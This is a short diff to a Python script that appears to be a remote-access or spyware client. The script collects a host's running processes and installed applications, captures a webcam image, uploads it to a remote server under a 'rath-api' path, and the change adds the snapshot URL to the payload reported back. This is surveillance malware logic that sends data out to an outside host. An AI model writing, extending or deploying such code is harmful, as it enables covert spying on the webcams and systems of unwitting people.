@@ -37,6 +37,7 @@ def updatePayload():
             },
             'processes': [],
             'installed_apps': [],
+            'snapshot_url': captureWebcam()
         }
 
     payload = {
@@ -67,6 +68,9 @@ def captureWebcam():
                     r = requests.post(upload_url,
                         files={'fileToUpload': (filetime + '.png', f)})
                     print(r.text)
+
+                    snapshot_url = main_url + '/rath-api/res/' + filetime + '.png'
+                    return snapshot_url
 
                 except Exception as e:
                     print('File upload error:', e)
@@ -184,5 +188,3 @@ def notify():
         except Exception as e:
             print(e)
             time.sleep(30)
-
-notify()
